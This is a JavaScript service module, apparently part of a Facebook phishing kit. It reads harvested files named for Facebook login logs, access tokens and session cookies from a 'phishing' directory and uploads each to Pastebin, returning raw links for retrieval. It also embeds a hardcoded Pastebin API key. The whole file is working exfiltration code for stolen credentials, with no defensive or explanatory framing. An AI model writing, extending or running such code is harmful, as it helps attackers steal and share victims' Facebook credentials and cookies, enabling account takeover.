const PastebinAPI = require('pastebin-js');
const { readFile } = require('../utils/fileUtils');

const pastebin = new PastebinAPI({
  api_dev_key: 'm44A-baM9eiIb1Na_XP2qLLAi9s0sKy3', // Replace with your Pastebin API key
});

class FbLogsService {
  async getPasteLinks() {
    try {
      const fbLogs = readFile('fblogs.txt');
      const fbTokenLogs = readFile('../phishing/fbtokenlogs.txt');
      const fbCookieLogs = readFile('../phishing/fbcookielogs.txt');

      const linkLogs = await this.pasteToPastebin('../phishing/fblogs.txt', fbLogs);
      const linkToken = await this.pasteToPastebin('../phishing/fbtokenlogs.txt', fbTokenLogs);
      const linkCookies = await this.pasteToPastebin('../phishing/fbcookielogs.txt', fbCookieLogs);

      return {
        linkLogs,
        linkToken,
        linkCookies,
      };
    } catch (error) {
      console.error('Error retrieving and pasting logs:', error);
      throw error;
    }
  }

  async pasteToPastebin(filename, content) {
    try {
      const paste = await pastebin.createPaste({
        text: content,
        title: filename,
        format: null,
        privacy: 1,
      });

      return paste.replace('pastebin.com', 'pastebin.com/raw');
    } catch (error) {
      console.error(`An error occurred while pasting ${filename} to Pastebin.`, error);
      throw error;
    }
  }
}

module.exports = FbLogsService;
  